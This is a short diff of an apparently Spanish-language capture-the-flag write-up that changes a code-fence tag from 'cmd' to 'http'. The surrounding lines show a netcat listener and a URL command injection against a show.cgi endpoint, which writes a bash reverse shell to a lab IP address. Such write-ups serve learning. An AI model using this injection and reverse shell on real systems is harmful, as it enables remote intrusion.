@@ -82,7 +82,7 @@ Entonces para sacar la flag de root sería entrando a `http://localhost:10000/fi
 
 primero deberemos escuchar con `nc -lvp 4444`
 
-```cmd
+```http
 http://localhost:10000/file/show.cgi/bin/7|echo "bash -i >& /dev/tcp/10.13.13.243/4444 0>&1
 ">/tmp/shell.sh|
 
